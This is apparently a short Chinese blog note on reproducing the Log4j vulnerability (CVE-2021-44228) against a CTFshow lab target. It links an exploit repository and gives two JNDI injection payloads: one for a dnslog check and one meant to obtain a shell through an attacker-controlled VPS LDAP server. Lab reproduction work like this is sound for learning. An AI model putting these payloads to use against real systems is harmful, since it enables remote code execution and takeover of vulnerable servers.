---
title: "[漏洞复现]Log4j(CVE-2021-44228) 简单复现"
desc: TonyD0g
toc: true
date: 2022-04-26 15:10:40
tags: 漏洞复现
---
<font size=4 >

<!-- more -->

# 前言:
2021年12月份爆出的漏洞，但是因为是java组件我了解的不多所以一直没有去复现。
前些天hvv面试问了，直接答的没复现。我感觉这样啥都不懂是不行的，所以今天抽空看了下复现。
`仅仅复现了，具体代码原理不清楚`。主要靠别的师傅博客进行学习。

# 复现过程：

给的两张图讲的很明白：
[log4j](https://blog.csdn.net/hiahiaQ_Q/article/details/123720995)

[EXP](https://github.com/Yihsiwei/Log4j-exp)

# 所需条件：

CTFshow靶场 , 一台VPS

[Base64在线](https://www.ltool.net/base64-encode-and-decode-in-simplified-chinese.php)

[Url编码](https://www.bejson.com/enc/urlencode/)

[dnslog](http://www.dnslog.cn/)

# 验证playload:
${jndi:ldap://TonyD0g.dnslog.cn}

# GetShell playload:
${jndi:ldap://VPSIP:1389/Basic/Command/Base64/xxxxxxxxx}


</font>